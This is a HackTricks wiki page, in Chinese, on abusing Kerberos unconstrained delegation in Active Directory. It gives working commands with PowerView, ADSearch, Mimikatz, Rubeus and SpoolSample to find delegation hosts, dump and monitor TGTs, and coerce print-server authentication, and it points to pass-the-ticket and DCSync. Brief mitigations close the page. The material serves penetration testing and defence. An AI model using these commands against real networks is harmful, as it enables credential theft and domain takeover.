# Unconstrained Delegation

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

## Unconstrained delegation

这是一个域管理员可以设置在域内任何 **计算机** 上的功能。然后，每当 **用户登录** 到该计算机时，该用户的 **TGT 副本** 将会被 **发送到 DC 提供的 TGS 中** **并保存在 LSASS 的内存中**。因此，如果您在该机器上拥有管理员权限，您将能够 **转储票证并冒充用户** 在任何机器上。

因此，如果域管理员登录到启用了“无约束委派”功能的计算机，并且您在该机器上拥有本地管理员权限，您将能够转储票证并在任何地方冒充域管理员（域权限提升）。

您可以通过检查 [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) 属性是否包含 [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) 来 **查找具有此属性的计算机对象**。您可以使用 LDAP 过滤器 ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ 来执行此操作，这正是 powerview 所做的：

<pre class="language-bash"><code class="lang-bash"># 列出无约束计算机
## Powerview
Get-NetComputer -Unconstrained #DCs 总是出现，但对权限提升没有用
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># 使用 Mimikatz 导出票证
</strong>privilege::debug
sekurlsa::tickets /export #推荐方式
kerberos::list /export #另一种方式

# 监控登录并导出新票证
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #每 10 秒检查一次新 TGT</code></pre>

使用 **Mimikatz** 或 **Rubeus** 在内存中加载管理员（或受害者用户）的票证以进行 [**票证传递**](pass-the-ticket.md)**.**\
更多信息：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**关于无约束委派的更多信息在 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **强制身份验证**

如果攻击者能够 **攻陷一个允许“无约束委派”的计算机**，他可以 **欺骗** 一个 **打印服务器** 使其 **自动登录**，并 **在服务器的内存中保存 TGT**。\
然后，攻击者可以执行 **票证传递攻击以冒充** 用户打印服务器计算机帐户。

要使打印服务器登录到任何机器，您可以使用 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)：
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
如果 TGT 来自域控制器，您可以执行一个[ **DCSync 攻击**](acl-persistence-abuse/#dcsync)并从 DC 获取所有哈希。\
[**有关此攻击的更多信息，请访问 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**以下是尝试强制身份验证的其他方法：**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### 缓解措施

* 将 DA/Admin 登录限制为特定服务
* 为特权账户设置“账户是敏感的，无法被委派”。

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
